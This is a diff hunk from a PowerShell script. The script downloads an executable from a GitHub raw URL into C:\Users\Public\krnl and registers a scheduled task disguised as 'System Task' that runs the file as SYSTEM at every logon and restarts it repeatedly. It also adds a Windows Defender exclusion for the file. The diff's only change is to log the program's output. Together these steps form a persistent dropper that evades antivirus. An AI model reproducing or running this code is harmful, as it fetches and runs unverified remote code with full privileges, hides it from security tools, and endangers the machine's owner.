@@ -2,7 +2,7 @@ New-Item -ItemType Directory -Path C:\Users\Public\krnl
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/milujemnastenky/bombardini-gusini/main/apps/schvostkrnl-debug.exe" -OutFile "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
-Register-ScheduledTask -TaskName "WINschvostkrnl" -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start schvostkrnl-debug.exe" -WorkingDirectory "C:\Users\Public\krnl") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force
+Register-ScheduledTask -TaskName "WINschvostkrnl" -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c schvostkrnl-debug.exe > log.txt 2>&1" -WorkingDirectory "C:\Users\Public\krnl") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force
 
 Add-MpPreference -ExclusionPath "C:\Users\Public\krnl\schvostkrnl-debug.exe"
 
